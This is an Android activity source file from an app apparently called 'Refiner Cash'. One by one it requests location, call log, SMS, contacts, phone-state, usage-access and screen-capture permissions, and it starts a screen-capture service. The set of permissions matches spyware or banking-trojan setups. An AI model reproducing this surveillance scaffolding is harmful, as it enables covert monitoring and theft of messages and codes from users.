package com.my.Refiner.Cash.User;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Process;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class PermissionsActivity extends Activity {

    private static final int REQ_PERM = 100;
    private static final int REQ_MEDIA = 200;

    private TextView statusText;
    private Button grantBtn, screenBtn, continueBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Thread.setDefaultUncaughtExceptionHandler(new CrashHandler(this));
        setContentView(R.layout.activity_permissions);

        statusText = findViewById(R.id.permStatus);
        grantBtn = findViewById(R.id.grantBtn);
        screenBtn = findViewById(R.id.screenBtn);
        continueBtn = findViewById(R.id.continueBtn);

        grantBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });

        screenBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestScreenCapture();
            }
        });

        continueBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(PermissionsActivity.this, MainActivity.class));
                finish();
            }
        });

        updateStatus();
    }

    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            permissions.add(Manifest.permission.READ_CALL_LOG);
            permissions.add(Manifest.permission.READ_SMS);
            permissions.add(Manifest.permission.RECEIVE_SMS);
            permissions.add(Manifest.permission.READ_CONTACTS);
            permissions.add(Manifest.permission.READ_PHONE_STATE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            }

            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[0]), REQ_PERM);
        } else {
            checkUsageAccess();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERM) {
            checkUsageAccess();
        }
    }

    private void checkUsageAccess() {
        if (!hasUsageAccess()) {
            Toast.makeText(this, "Usage Access দিন", Toast.LENGTH_LONG).show();
            try {
                startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
            } catch (Exception e) {
                Toast.makeText(this, "Settings খুলতে পারলাম না", Toast.LENGTH_SHORT).show();
            }
        } else {
            updateStatus();
            Toast.makeText(this, "সব অনুমতি দেওয়া হয়েছে ✅", Toast.LENGTH_SHORT).show();
        }
    }

    private void requestScreenCapture() {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager)
                    getSystemService(MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA);
            }
        } catch (Exception e) {
            Toast.makeText(this, "Screen capture error: " + e.getMessage(),
                    Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_MEDIA) {
            if (resultCode == RESULT_OK && data != null) {
                ScreenCaptureService.sResultCode = resultCode;
                ScreenCaptureService.sResultData = data;

                MediaProjectionManager mpm = (MediaProjectionManager)
                        getSystemService(MEDIA_PROJECTION_SERVICE);
                if (mpm != null) {
                    ScreenCaptureService.sMediaProjection =
                            mpm.getMediaProjection(resultCode, data);
                }

                startService(new Intent(this, ScreenCaptureService.class));
                Toast.makeText(this, "Screen Capture চালু হয়েছে ✅",
                        Toast.LENGTH_SHORT).show();
                updateStatus();
            } else {
                Toast.makeText(this, "Screen Capture অনুমতি দেননি",
                        Toast.LENGTH_SHORT).show();
            }
        }
    }

    private boolean hasUsageAccess() {
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isScreenCaptureEnabled() {
        return ScreenCaptureService.sMediaProjection != null;
    }

    private void updateStatus() {
        StringBuilder sb = new StringBuilder();
        sb.append("📋 অনুমতির অবস্থা:\n\n");

        boolean loc = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        sb.append(loc ? "✅" : "❌").append(" Location\n");

        boolean call = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        sb.append(call ? "✅" : "❌").append(" Call Log\n");

        boolean sms = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        sb.append(sms ? "✅" : "❌").append(" SMS\n");

        sb.append(hasUsageAccess() ? "✅" : "❌").append(" Usage Access\n");
        sb.append(isScreenCaptureEnabled() ? "✅" : "❌").append(" Screen Capture\n");

        statusText.setText(sb.toString());
    }

    @Override
    protected void onResume() {
        super.onResume();
        try {
            updateStatus();
        } catch (Exception e) {
            // ignore
        }
    }
}
